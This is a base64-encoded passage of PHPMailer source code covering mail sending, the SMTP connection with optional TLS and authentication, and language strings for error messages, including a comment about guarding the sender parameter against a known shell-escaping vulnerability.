ICAgICAgICR0b0FycltdID0gJHRoaXMtPmFkZHJGb3JtYXQoJHRvYWRkcik7DQogICAgICAgIH0NCiAgICAgICAgJHRvID0gaW1wbG9kZSgnLCAnLCAkdG9BcnIpOw0KDQogICAgICAgICRwYXJhbXMgPSBudWxsOw0KICAgICAgICAvL1RoaXMgc2V0cyB0aGUgU01UUCBlbnZlbG9wZSBzZW5kZXIgd2hpY2ggZ2V0cyB0dXJuZWQgaW50byBhIHJldHVybi1wYXRoIGhlYWRlciBieSB0aGUgcmVjZWl2ZXINCiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+U2VuZGVyKSBhbmQgJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkdGhpcy0+U2VuZGVyKSkgew0KICAgICAgICAgICAgLy8gQ1ZFLTIwMTYtMTAwMzMsIENWRS0yMDE2LTEwMDQ1OiBEb24ndCBwYXNzIC1mIGlmIGNoYXJhY3RlcnMgd2lsbCBiZSBlc2NhcGVkLg0KICAgICAgICAgICAgaWYgKHNlbGY6OmlzU2hlbGxTYWZlKCR0aGlzLT5TZW5kZXIpKSB7DQogICAgICAgICAgICAgICAgJHBhcmFtcyA9IHNwcmludGYoJy1mJXMnLCAkdGhpcy0+U2VuZGVyKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5TZW5kZXIpIGFuZCAhaW5pX2dldCgnc2FmZV9tb2RlJykgYW5kICR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJHRoaXMtPlNlbmRlcikpIHsNCiAgICAgICAgICAgICRvbGRfZnJvbSA9IGluaV9nZXQoJ3NlbmRtYWlsX2Zyb20nKTsNCiAgICAgICAgICAgIGluaV9zZXQoJ3NlbmRtYWlsX2Zyb20nLCAkdGhpcy0+U2VuZGVyKTsNCiAgICAgICAgfQ0KICAgICAgICAkcmVzdWx0ID0gZmFsc2U7DQogICAgICAgIGlmICgkdGhpcy0+U2luZ2xlVG8gYW5kIGNvdW50KCR0b0FycikgPiAxKSB7DQogICAgICAgICAgICBmb3JlYWNoICgkdG9BcnIgYXMgJHRvQWRkcikgew0KICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkdGhpcy0+bWFpbFBhc3N0aHJ1KCR0b0FkZHIsICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcyk7DQogICAgICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soJHJlc3VsdCwgYXJyYXkoJHRvQWRkciksICR0aGlzLT5jYywgJHRoaXMtPmJjYywgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkdGhpcy0+RnJvbSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkcmVzdWx0ID0gJHRoaXMtPm1haWxQYXNzdGhydSgkdG8sICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBhcmFtcyk7DQogICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygkcmVzdWx0LCAkdGhpcy0+dG8sICR0aGlzLT5jYywgJHRoaXMtPmJjYywgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkdGhpcy0+RnJvbSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzc2V0KCRvbGRfZnJvbSkpIHsNCiAgICAgICAgICAgIGluaV9zZXQoJ3NlbmRtYWlsX2Zyb20nLCAkb2xkX2Zyb20pOw0KICAgICAgICB9DQogICAgICAgIGlmICghJHJlc3VsdCkgew0KICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnaW5zdGFudGlhdGUnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogR2V0IGFuIGluc3RhbmNlIHRvIHVzZSBmb3IgU01UUCBvcGVyYXRpb25zLg0KICAgICAqIE92ZXJyaWRlIHRoaXMgZnVuY3Rpb24gdG8gbG9hZCB5b3VyIG93biBTTVRQIGltcGxlbWVudGF0aW9uDQogICAgICogQHJldHVybiBTTVRQDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGdldFNNVFBJbnN0YW5jZSgpDQogICAgew0KICAgICAgICBpZiAoIWlzX29iamVjdCgkdGhpcy0+c210cCkpIHsNCiAgICAgICAgICAgICR0aGlzLT5zbXRwID0gbmV3IFNNVFA7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICR0aGlzLT5zbXRwOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIFNlbmQgbWFpbCB2aWEgU01UUC4NCiAgICAgKiBSZXR1cm5zIGZhbHNlIGlmIHRoZXJlIGlzIGEgYmFkIE1BSUwgRlJPTSwgUkNQVCwgb3IgREFUQSBpbnB1dC4NCiAgICAgKiBVc2VzIHRoZSBQSFBNYWlsZXJTTVRQIGNsYXNzIGJ5IGRlZmF1bHQuDQogICAgICogQHNlZSBQSFBNYWlsZXI6OmdldFNNVFBJbnN0YW5jZSgpIHRvIHVzZSBhIGRpZmZlcmVudCBjbGFzcy4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRoZWFkZXIgVGhlIG1lc3NhZ2UgaGVhZGVycw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgVGhlIG1lc3NhZ2UgYm9keQ0KICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uDQogICAgICogQHVzZXMgU01UUA0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICogQHJldHVybiBib29sZWFuDQogICAgICovDQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNtdHBTZW5kKCRoZWFkZXIsICRib2R5KQ0KICAgIHsNCiAgICAgICAgJGJhZF9yY3B0ID0gYXJyYXkoKTsNCiAgICAgICAgaWYgKCEkdGhpcy0+c210cENvbm5lY3QoJHRoaXMtPlNNVFBPcHRpb25zKSkgew0KICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnc210cF9jb25uZWN0X2ZhaWxlZCcpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5TZW5kZXIpIGFuZCAkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCR0aGlzLT5TZW5kZXIpKSB7DQogICAgICAgICAgICAkc210cF9mcm9tID0gJHRoaXMtPlNlbmRlcjsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRzbXRwX2Zyb20gPSAkdGhpcy0+RnJvbTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5tYWlsKCRzbXRwX2Zyb20pKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ2Zyb21fZmFpbGVkJykgLiAkc210cF9mcm9tIC4gJyA6ICcgLiBpbXBsb2RlKCcsJywgJHRoaXMtPnNtdHAtPmdldEVycm9yKCkpKTsNCiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPkVycm9ySW5mbywgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgIH0NCg0KICAgICAgICAvLyBBdHRlbXB0IHRvIHNlbmQgdG8gYWxsIHJlY2lwaWVudHMNCiAgICAgICAgZm9yZWFjaCAoYXJyYXkoJHRoaXMtPnRvLCAkdGhpcy0+Y2MsICR0aGlzLT5iY2MpIGFzICR0b2dyb3VwKSB7DQogICAgICAgICAgICBmb3JlYWNoICgkdG9ncm91cCBhcyAkdG8pIHsNCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5yZWNpcGllbnQoJHRvWzBdKSkgew0KICAgICAgICAgICAgICAgICAgICAkZXJyb3IgPSAkdGhpcy0+c210cC0+Z2V0RXJyb3IoKTsNCiAgICAgICAgICAgICAgICAgICAgJGJhZF9yY3B0W10gPSBhcnJheSgndG8nID0+ICR0b1swXSwgJ2Vycm9yJyA9PiAkZXJyb3JbJ2RldGFpbCddKTsNCiAgICAgICAgICAgICAgICAgICAgJGlzU2VudCA9IGZhbHNlOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRpc1NlbnQgPSB0cnVlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygkaXNTZW50LCBhcnJheSgkdG9bMF0pLCBhcnJheSgpLCBhcnJheSgpLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICR0aGlzLT5Gcm9tKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIC8vIE9ubHkgc2VuZCB0aGUgREFUQSBjb21tYW5kIGlmIHdlIGhhdmUgdmlhYmxlIHJlY2lwaWVudHMNCiAgICAgICAgaWYgKChjb3VudCgkdGhpcy0+YWxsX3JlY2lwaWVudHMpID4gY291bnQoJGJhZF9yY3B0KSkgYW5kICEkdGhpcy0+c210cC0+ZGF0YSgkaGVhZGVyIC4gJGJvZHkpKSB7DQogICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdkYXRhX25vdF9hY2NlcHRlZCcpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJHRoaXMtPlNNVFBLZWVwQWxpdmUpIHsNCiAgICAgICAgICAgICR0aGlzLT5zbXRwLT5yZXNldCgpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnF1aXQoKTsNCiAgICAgICAgICAgICR0aGlzLT5zbXRwLT5jbG9zZSgpOw0KICAgICAgICB9DQogICAgICAgIC8vQ3JlYXRlIGVycm9yIG1lc3NhZ2UgZm9yIGFueSBiYWQgYWRkcmVzc2VzDQogICAgICAgIGlmIChjb3VudCgkYmFkX3JjcHQpID4gMCkgew0KICAgICAgICAgICAgJGVycnN0ciA9ICcnOw0KICAgICAgICAgICAgZm9yZWFjaCAoJGJhZF9yY3B0IGFzICRiYWQpIHsNCiAgICAgICAgICAgICAgICAkZXJyc3RyIC49ICRiYWRbJ3RvJ10gLiAnOiAnIC4gJGJhZFsnZXJyb3InXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oDQogICAgICAgICAgICAgICAgJHRoaXMtPmxhbmcoJ3JlY2lwaWVudHNfZmFpbGVkJykgLiAkZXJyc3RyLA0KICAgICAgICAgICAgICAgIHNlbGY6OlNUT1BfQ09OVElOVUUNCiAgICAgICAgICAgICk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogSW5pdGlhdGUgYSBjb25uZWN0aW9uIHRvIGFuIFNNVFAgc2VydmVyLg0KICAgICAqIFJldHVybnMgZmFsc2UgaWYgdGhlIG9wZXJhdGlvbiBmYWlsZWQuDQogICAgICogQHBhcmFtIGFycmF5ICRvcHRpb25zIEFuIGFycmF5IG9mIG9wdGlvbnMgY29tcGF0aWJsZSB3aXRoIHN0cmVhbV9jb250ZXh0X2NyZWF0ZSgpDQogICAgICogQHVzZXMgU01UUA0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24NCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4NCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gc210cENvbm5lY3QoJG9wdGlvbnMgPSBudWxsKQ0KICAgIHsNCiAgICAgICAgaWYgKGlzX251bGwoJHRoaXMtPnNtdHApKSB7DQogICAgICAgICAgICAkdGhpcy0+c210cCA9ICR0aGlzLT5nZXRTTVRQSW5zdGFuY2UoKTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vSWYgbm8gb3B0aW9ucyBhcmUgcHJvdmlkZWQsIHVzZSB3aGF0ZXZlciBpcyBzZXQgaW4gdGhlIGluc3RhbmNlDQogICAgICAgIGlmIChpc19udWxsKCRvcHRpb25zKSkgew0KICAgICAgICAgICAgJG9wdGlvbnMgPSAkdGhpcy0+U01UUE9wdGlvbnM7DQogICAgICAgIH0NCg0KICAgICAgICAvLyBBbHJlYWR5IGNvbm5lY3RlZD8NCiAgICAgICAgaWYgKCR0aGlzLT5zbXRwLT5jb25uZWN0ZWQoKSkgew0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCg0KICAgICAgICAkdGhpcy0+c210cC0+c2V0VGltZW91dCgkdGhpcy0+VGltZW91dCk7DQogICAgICAgICR0aGlzLT5zbXRwLT5zZXREZWJ1Z0xldmVsKCR0aGlzLT5TTVRQRGVidWcpOw0KICAgICAgICAkdGhpcy0+c210cC0+c2V0RGVidWdPdXRwdXQoJHRoaXMtPkRlYnVnb3V0cHV0KTsNCiAgICAgICAgJHRoaXMtPnNtdHAtPnNldFZlcnAoJHRoaXMtPmRvX3ZlcnApOw0KICAgICAgICAkaG9zdHMgPSBleHBsb2RlKCc7JywgJHRoaXMtPkhvc3QpOw0KICAgICAgICAkbGFzdGV4Y2VwdGlvbiA9IG51bGw7DQoNCiAgICAgICAgZm9yZWFjaCAoJGhvc3RzIGFzICRob3N0ZW50cnkpIHsNCiAgICAgICAgICAgICRob3N0aW5mbyA9IGFycmF5KCk7DQogICAgICAgICAgICBpZiAoIXByZWdfbWF0Y2goDQogICAgICAgICAgICAgICAgJy9eKChzc2x8dGxzKTpcL1wvKSooW2EtekEtWjAtOVwuLV0qfFxbW2EtZkEtRjAtOTpdK1xdKTo/KFswLTldKikkLycsDQogICAgICAgICAgICAgICAgdHJpbSgkaG9zdGVudHJ5KSwNCiAgICAgICAgICAgICAgICAkaG9zdGluZm8NCiAgICAgICAgICAgICkpIHsNCiAgICAgICAgICAgICAgICAvLyBOb3QgYSB2YWxpZCBob3N0IGVudHJ5DQogICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygnSWdub3JpbmcgaW52YWxpZCBob3N0OiAnIC4gJGhvc3RlbnRyeSk7DQogICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAvLyAkaG9zdGluZm9bMl06IG9wdGlvbmFsIHNzbCBvciB0bHMgcHJlZml4DQogICAgICAgICAgICAvLyAkaG9zdGluZm9bM106IHRoZSBob3N0bmFtZQ0KICAgICAgICAgICAgLy8gJGhvc3RpbmZvWzRdOiBvcHRpb25hbCBwb3J0IG51bWJlcg0KICAgICAgICAgICAgLy8gVGhlIGhvc3Qgc3RyaW5nIHByZWZpeCBjYW4gdGVtcG9yYXJpbHkgb3ZlcnJpZGUgdGhlIGN1cnJlbnQgc2V0dGluZyBmb3IgU01UUFNlY3VyZQ0KICAgICAgICAgICAgLy8gSWYgaXQncyBub3Qgc3BlY2lmaWVkLCB0aGUgZGVmYXVsdCB2YWx1ZSBpcyB1c2VkDQogICAgICAgICAgICAkcHJlZml4ID0gJyc7DQogICAgICAgICAgICAkc2VjdXJlID0gJHRoaXMtPlNNVFBTZWN1cmU7DQogICAgICAgICAgICAkdGxzID0gKCR0aGlzLT5TTVRQU2VjdXJlID09ICd0bHMnKTsNCiAgICAgICAgICAgIGlmICgnc3NsJyA9PSAkaG9zdGluZm9bMl0gb3IgKCcnID09ICRob3N0aW5mb1syXSBhbmQgJ3NzbCcgPT0gJHRoaXMtPlNNVFBTZWN1cmUpKSB7DQogICAgICAgICAgICAgICAgJHByZWZpeCA9ICdzc2w6Ly8nOw0KICAgICAgICAgICAgICAgICR0bHMgPSBmYWxzZTsgLy8gQ2FuJ3QgaGF2ZSBTU0wgYW5kIFRMUyBhdCB0aGUgc2FtZSB0aW1lDQogICAgICAgICAgICAgICAgJHNlY3VyZSA9ICdzc2wnOw0KICAgICAgICAgICAgfSBlbHNlaWYgKCRob3N0aW5mb1syXSA9PSAndGxzJykgew0KICAgICAgICAgICAgICAgICR0bHMgPSB0cnVlOw0KICAgICAgICAgICAgICAgIC8vIHRscyBkb2Vzbid0IHVzZSBhIHByZWZpeA0KICAgICAgICAgICAgICAgICRzZWN1cmUgPSAndGxzJzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIC8vRG8gd2UgbmVlZCB0aGUgT3BlblNTTCBleHRlbnNpb24/DQogICAgICAgICAgICAkc3NsZXh0ID0gZGVmaW5lZCgnT1BFTlNTTF9BTEdPX1NIQTEnKTsNCiAgICAgICAgICAgIGlmICgndGxzJyA9PT0gJHNlY3VyZSBvciAnc3NsJyA9PT0gJHNlY3VyZSkgew0KICAgICAgICAgICAgICAgIC8vQ2hlY2sgZm9yIGFuIE9wZW5TU0wgY29uc3RhbnQgcmF0aGVyIHRoYW4gdXNpbmcgZXh0ZW5zaW9uX2xvYWRlZCwgd2hpY2ggaXMgc29tZXRpbWVzIGRpc2FibGVkDQogICAgICAgICAgICAgICAgaWYgKCEkc3NsZXh0KSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4dGVuc2lvbl9taXNzaW5nJykuJ29wZW5zc2wnLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkaG9zdCA9ICRob3N0aW5mb1szXTsNCiAgICAgICAgICAgICRwb3J0ID0gJHRoaXMtPlBvcnQ7DQogICAgICAgICAgICAkdHBvcnQgPSAoaW50ZWdlcikkaG9zdGluZm9bNF07DQogICAgICAgICAgICBpZiAoJHRwb3J0ID4gMCBhbmQgJHRwb3J0IDwgNjU1MzYpIHsNCiAgICAgICAgICAgICAgICAkcG9ydCA9ICR0cG9ydDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkdGhpcy0+c210cC0+Y29ubmVjdCgkcHJlZml4IC4gJGhvc3QsICRwb3J0LCAkdGhpcy0+VGltZW91dCwgJG9wdGlvbnMpKSB7DQogICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5IZWxvKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkaGVsbG8gPSAkdGhpcy0+SGVsbzsNCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRoZWxsbyA9ICR0aGlzLT5zZXJ2ZXJIb3N0bmFtZSgpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5oZWxsbygkaGVsbG8pOw0KICAgICAgICAgICAgICAgICAgICAvL0F1dG9tYXRpY2FsbHkgZW5hYmxlIFRMUyBlbmNyeXB0aW9uIGlmOg0KICAgICAgICAgICAgICAgICAgICAvLyAqIGl0J3Mgbm90IGRpc2FibGVkDQogICAgICAgICAgICAgICAgICAgIC8vICogd2UgaGF2ZSBvcGVuc3NsIGV4dGVuc2lvbg0KICAgICAgICAgICAgICAgICAgICAvLyAqIHdlIGFyZSBub3QgYWxyZWFkeSB1c2luZyBTU0wNCiAgICAgICAgICAgICAgICAgICAgLy8gKiB0aGUgc2VydmVyIG9mZmVycyBTVEFSVFRMUw0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPlNNVFBBdXRvVExTIGFuZCAkc3NsZXh0IGFuZCAkc2VjdXJlICE9ICdzc2wnIGFuZCAkdGhpcy0+c210cC0+Z2V0U2VydmVyRXh0KCdTVEFSVFRMUycpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkdGxzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRscykgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c210cC0+c3RhcnRUTFMoKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2Nvbm5lY3RfaG9zdCcpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIFdlIG11c3QgcmVzZW5kIEVITE8gYWZ0ZXIgVExTIG5lZ290aWF0aW9uDQogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+aGVsbG8oJGhlbGxvKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPlNNVFBBdXRoKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5hdXRoZW50aWNhdGUoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlVzZXJuYW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5QYXNzd29yZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+QXV0aFR5cGUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlJlYWxtLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5Xb3Jrc3RhdGlvbg0KICAgICAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnYXV0aGVudGljYXRlJykpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgICAgIH0gY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7DQogICAgICAgICAgICAgICAgICAgICRsYXN0ZXhjZXB0aW9uID0gJGV4YzsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXhjLT5nZXRNZXNzYWdlKCkpOw0KICAgICAgICAgICAgICAgICAgICAvLyBXZSBtdXN0IGhhdmUgY29ubmVjdGVkLCBidXQgdGhlbiBmYWlsZWQgVExTIG9yIEF1dGgsIHNvIGNsb3NlIGNvbm5lY3Rpb24gbmljZWx5DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5xdWl0KCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIC8vIElmIHdlIGdldCBoZXJlLCBhbGwgY29ubmVjdGlvbiBhdHRlbXB0cyBoYXZlIGZhaWxlZCwgc28gY2xvc2UgY29ubmVjdGlvbiBoYXJkDQogICAgICAgICR0aGlzLT5zbXRwLT5jbG9zZSgpOw0KICAgICAgICAvLyBBcyB3ZSd2ZSBjYXVnaHQgYWxsIGV4Y2VwdGlvbnMsIGp1c3QgcmVwb3J0IHdoYXRldmVyIHRoZSBsYXN0IG9uZSB3YXMNCiAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zIGFuZCAhaXNfbnVsbCgkbGFzdGV4Y2VwdGlvbikpIHsNCiAgICAgICAgICAgIHRocm93ICRsYXN0ZXhjZXB0aW9uOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBDbG9zZSB0aGUgYWN0aXZlIFNNVFAgc2Vzc2lvbiBpZiBvbmUgZXhpc3RzLg0KICAgICAqIEByZXR1cm4gdm9pZA0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBzbXRwQ2xvc2UoKQ0KICAgIHsNCiAgICAgICAgaWYgKGlzX2EoJHRoaXMtPnNtdHAsICdTTVRQJykpIHsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+c210cC0+Y29ubmVjdGVkKCkpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+cXVpdCgpOw0KICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5jbG9zZSgpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgLyoqDQogICAgICogU2V0IHRoZSBsYW5ndWFnZSBmb3IgZXJyb3IgbWVzc2FnZXMuDQogICAgICogUmV0dXJucyBmYWxzZSBpZiBpdCBjYW5ub3QgbG9hZCB0aGUgbGFuZ3VhZ2UgZmlsZS4NCiAgICAgKiBUaGUgZGVmYXVsdCBsYW5ndWFnZSBpcyBFbmdsaXNoLg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGxhbmdjb2RlIElTTyA2MzktMSAyLWNoYXJhY3RlciBsYW5ndWFnZSBjb2RlIChlLmcuIEZyZW5jaCBpcyAiZnIiKQ0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGxhbmdfcGF0aCBQYXRoIHRvIHRoZSBsYW5ndWFnZSBmaWxlIGRpcmVjdG9yeSwgd2l0aCB0cmFpbGluZyBzZXBhcmF0b3IgKHNsYXNoKQ0KICAgICAqIEByZXR1cm4gYm9vbGVhbg0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIHNldExhbmd1YWdlKCRsYW5nY29kZSA9ICdlbicsICRsYW5nX3BhdGggPSAnJykNCiAgICB7DQogICAgICAgIC8vIEJhY2t3YXJkcyBjb21wYXRpYmlsaXR5IGZvciByZW5hbWVkIGxhbmd1YWdlIGNvZGVzDQogICAgICAgICRyZW5hbWVkX2xhbmdjb2RlcyA9IGFycmF5KA0KICAgICAgICAgICAgJ2JyJyA9PiAncHRfYnInLA0KICAgICAgICAgICAgJ2N6JyA9PiAnY3MnLA0KICAgICAgICAgICAgJ2RrJyA9PiAnZGEnLA0KICAgICAgICAgICAgJ25vJyA9PiAnbmInLA0KICAgICAgICAgICAgJ3NlJyA9PiAnc3YnLA0KICAgICAgICAgICAgJ3NyJyA9PiAncnMnDQogICAgICAgICk7DQoNCiAgICAgICAgaWYgKGlzc2V0KCRyZW5hbWVkX2xhbmdjb2Rlc1skbGFuZ2NvZGVdKSkgew0KICAgICAgICAgICAgJGxhbmdjb2RlID0gJHJlbmFtZWRfbGFuZ2NvZGVzWyRsYW5nY29kZV07DQogICAgICAgIH0NCg0KICAgICAgICAvLyBEZWZpbmUgZnVsbCBzZXQgb2YgdHJhbnNsYXRhYmxlIHN0cmluZ3MgaW4gRW5nbGlzaA0KICAgICAgICAkUEhQTUFJTEVSX0xBTkcgPSBhcnJheSgNCiAgICAgICAgICAgICdhdXRoZW50aWNhdGUnID0+ICdTTVRQIEVycm9yOiBDb3VsZCBub3QgYXV0aGVudGljYXRlLicsDQogICAgICAgICAgICAnY29ubmVjdF9ob3N0JyA9PiAnU01UUCBFcnJvcjogQ291bGQgbm90IGNvbm5lY3QgdG8gU01UUCBob3N0LicsDQogICAgICAgICAgICAnZGF0YV9ub3RfYWNjZXB0ZWQnID0+ICdTTVRQIEVycm9yOiBkYXRhIG5vdCBhY2NlcHRlZC4nLA0KICAgICAgICAgICAgJ2VtcHR5X21lc3NhZ2UnID0+ICdNZXNzYWdlIGJvZHkgZW1wdHknLA0KICAgICAgICAgICAgJ2VuY29kaW5nJyA9PiAnVW5rbm93biBlbmNvZGluZzogJywNCiAgICAgICAgICAgICdleGVjdXRlJyA9PiAnQ291bGQgbm90IGV4ZWN1dGU6ICcsDQogICAgICAgICAgICAnZmlsZV9hY2Nlc3MnID0+ICdDb3VsZCBub3QgYWNjZXNzIGZpbGU6ICcsDQogICAgICAgICAgICAnZmlsZV9vcGVuJyA9PiAnRmlsZSBFcnJvcjogQ291bGQgbm90IG9wZW4gZmlsZTogJywNCiAgICAgICAgICAgICdmcm9tX2ZhaWxlZCcgPT4gJ1RoZSBmb2xsb3dpbmcgRnJvbSBhZGRyZXNzIGZhaWxlZDogJywNCiAgICAgICAgICAgICdpbnN0YW50aWF0ZScgPT4gJ0NvdWxkIG5vdCBpbnN0YW50aWF0ZSBtYWlsIGZ1bmN0aW9uLicsDQogICAgICAgICAgICAnaW52YWxpZF9hZGRyZXNzJyA9PiAnSW52YWxpZCBhZGRyZXNzOiAnLA0KICAgICAgICAgICAgJ21haWxlcl9ub3Rfc3VwcG9ydGVkJyA9PiAnIG1haWxlciBpcyBub3Qgc3VwcG9ydGVkLicsDQogICAgICAgICAgICAncHJvdmlkZV9hZGRyZXNzJyA9PiAnWW91IG11c3QgcHJvdmlkZSBhdCBsZWFzdCBvbmUgcmVjaXBpZW50IGVtYWlsIGFkZHJlc3MuJywNCiAgICAgICAgICAgICdyZWNpcGllbnRzX2ZhaWxlZCcgPT4gJ1NNVFAgRXJyb3I6IFRoZSBmb2xsb3dpbmcgcmVjaXBpZW50cyBmYWlsZWQ6ICcsDQogICAgICAgICAgICAnc2lnbmluZycgPT4gJ1NpZ25pbmcgRXJyb3I6ICcsDQogICAgICAgICAgICAnc210cF9jb25uZWN0X2ZhaWxlZCcgPT4gJ1NNVFAgY29ubmVjdCgpIGZhaWxlZC4nLA0KICAgICAgICAgICAgJ3NtdHBfZXJyb3InID0+ICdTTVRQIHNlcnZlciBlcnJvcjogJywNCiAgICAgICAgICAgICd2YXJpYWJsZV9zZXQnID0+ICdD